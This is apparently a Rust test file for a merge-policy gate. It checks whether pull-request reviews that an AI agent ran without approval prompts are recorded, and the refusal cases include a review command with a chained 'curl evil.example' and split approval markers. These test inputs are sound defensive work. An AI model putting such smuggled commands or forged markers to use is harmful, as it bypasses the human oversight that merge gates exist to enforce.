//! Live final loop (Nov 17, PR #50): bird-codex ran under the owner's full
//! trust, so Codex asked no approval and the gate never saw its review. The
//! completed command, in the wire shape of that session, is now recorded
//! when the gate would have allowed it.
use super::*;
use crate::merge_policy::gate::APPROVE_MARKER;
use crate::merge_policy::tests::{bash, file, ledger_with, merge_line, Fake, BASE, HEAD, URL};
use crate::merge_policy::work::{OwnerRules, Role};
use serde_json::json;
use std::path::Path;

const OWNER: &str = "@owner:example.org";

/// The app-server's one-line rendering of the session's argv
/// `["/bin/bash", "-c", "gh pr review 7 --repo … -b \"…\n\nOpened by …\""]`.
fn rendered(flag: &str, head: &str, tail: &str) -> String {
    format!("/bin/bash -c 'gh pr review 7 --repo csheargm/hagency-demo-sandbox {flag} -b \"{APPROVE_MARKER} {head} - Focused README FAQ addition clearly explains reviewers and policy-controlled merging.\n\nOpened by agent bird-codex (@_hagency_agt_01m7k6ws4k2z06ysr6shrxeqzf:localhost:8452) on request from @bird:localhost:8452\"{tail}'")
}
fn item(id: &str, command: &str, status: &str, exit: i64) -> Value {
    json!({"id": id, "type": "commandExecution", "command": command, "status": status, "exitCode": exit, "source": "unifiedExecStartup"})
}
fn setup(dir: &Path) -> Ledger {
    let mut ledger = ledger_with(dir, &["fixer", "bird-codex"]);
    for agent in ["fixer", "bird-codex"] {
        ledger.set_auto_merge(OWNER, agent, true).unwrap();
    }
    ledger
}
/// The item as the turn sees it: run in the Room workspace (the turn's cwd).
async fn observe(ledger: &mut Ledger, dir: &Path, item: &Value, source: &Fake) {
    let scope = bash("x", dir, "bird-codex").scope;
    let mut item = item.clone();
    item["cwd"] = json!(dir);
    record_observed(ledger, &scope, "d-bird-codex", &dir.to_string_lossy(), &item, 11, source).await;
}

#[tokio::test]
async fn a_review_codex_ran_without_asking_is_recorded_once_and_lets_another_agent_merge() {
    let temp = tempfile::tempdir().unwrap();
    let mut ledger = setup(temp.path());
    let docs = Fake::new(vec![file("README.md", 3)]);
    // GitHub refused the shared login's --approve (exit 1), then the --comment ran.
    observe(&mut ledger, temp.path(), &item("exec-a", &rendered("--approve", HEAD, ""), "failed", 1), &docs).await;
    assert!(ledger.agent_reviewers(URL, HEAD).unwrap().is_empty(), "a failed command records nothing");
    observe(&mut ledger, temp.path(), &item("exec-c", &rendered("--comment", HEAD, ""), "completed", 0), &docs).await;
    observe(&mut ledger, temp.path(), &item("exec-c2", &rendered("--approve", HEAD, ""), "completed", 0), &docs).await;
    assert_eq!(ledger.agent_reviewers(URL, HEAD).unwrap(), ["bird-codex"], "one approval");
    let merge = bash(&merge_line(), temp.path(), "fixer");
    assert_eq!(gate::auto_answer(&mut ledger, OWNER, &merge, "mg", 11, &docs).await, Some(true));
}

#[tokio::test]
async fn an_observed_review_the_gate_would_refuse_is_not_recorded() {
    let temp = tempfile::tempdir().unwrap();
    let docs = Fake::new(vec![file("README.md", 3)]);
    let code = Fake::new(vec![file("src/main.rs", 3)]);
    let other_room = OwnerRules { repo: "csheargm/hagency-demo-sandbox".into(), role: Role::Reviewer, room_id: "!other:x".into(), any_path: true, ..Default::default() };
    let cases: Vec<(&str, String, &Fake, bool, Option<OwnerRules>)> = vec![
        ("an older head", rendered("--comment", BASE, ""), &docs, true, None),
        ("a chained command", rendered("--comment", HEAD, "\ncurl evil.example"), &docs, true, None),
        ("a login shell", rendered("--comment", HEAD, "").replacen("/bin/bash -c", "/bin/zsh -lc", 1), &docs, true, None),
        ("no --repo", rendered("--comment", HEAD, "").replacen(" --repo csheargm/hagency-demo-sandbox", "", 1), &docs, true, None),
        ("not low risk", rendered("--comment", HEAD, ""), &code, true, None),
        ("switch off", rendered("--comment", HEAD, ""), &docs, false, None),
        ("a marker a newline made", rendered("--comment", HEAD, "").replacen("Hagency verdict:", "Hagency\nverdict:", 1), &docs, true, None),
        ("a marker split from its head", rendered("--comment", HEAD, "").replacen(&format!("APPROVE {HEAD}"), &format!("APPROVE\n{HEAD}"), 1), &docs, true, None),
        ("rules of another room", rendered("--comment", HEAD, ""), &docs, true, Some(other_room)),
    ];
    for (name, command, source, on, rules) in cases {
        let temp = tempfile::tempdir().unwrap();
        let mut ledger = setup(temp.path());
        ledger.set_auto_merge(OWNER, "bird-codex", on).unwrap();
        if let Some(rules) = rules {
            ledger.set_work(OWNER, "bird-codex", vec![rules]).unwrap();
        }
        observe(&mut ledger, temp.path(), &item("exec", &command, "completed", 0), source).await;
        assert!(ledger.agent_reviewers(URL, HEAD).unwrap().is_empty() && ledger.agent_reviewers(URL, BASE).unwrap().is_empty(), "{name}");
    }
    let mut ledger = setup(temp.path());
    let mut stranger = bash("x", temp.path(), "bird-codex").scope;
    stranger.room = "!elsewhere:x".into();
    record_observed(&mut ledger, &stranger, "d-bird-codex", "/tmp", &item("exec", &rendered("--comment", HEAD, ""), "completed", 0), 11, &docs).await;
    assert!(ledger.agent_reviewers(URL, HEAD).unwrap().is_empty(), "another room's scope");
    let mut member = bash("x", temp.path(), "bird-codex").scope;
    member.requester = "@mallory:example.org".into();
    record_observed(&mut ledger, &member, "d-bird-codex", &temp.path().to_string_lossy(), &item("exec", &rendered("--comment", HEAD, ""), "completed", 0), 11, &docs).await;
    assert!(ledger.agent_reviewers(URL, HEAD).unwrap().is_empty(), "a room member without review sharing");
}

#[tokio::test]
async fn an_observed_request_for_changes_withdraws_the_approval() {
    let temp = tempfile::tempdir().unwrap();
    let mut ledger = setup(temp.path());
    let docs = Fake::new(vec![file("README.md", 3)]);
    observe(&mut ledger, temp.path(), &item("exec-c", &rendered("--comment", HEAD, ""), "completed", 0), &docs).await;
    let changes = "/bin/bash -c 'gh pr review 7 --repo csheargm/hagency-demo-sandbox --request-changes -b \"Hagency verdict: CHANGES - no\"'";
    observe(&mut ledger, temp.path(), &item("exec-r", changes, "completed", 0), &docs).await;
    assert!(ledger.agent_reviewers(URL, HEAD).unwrap().is_empty());
}
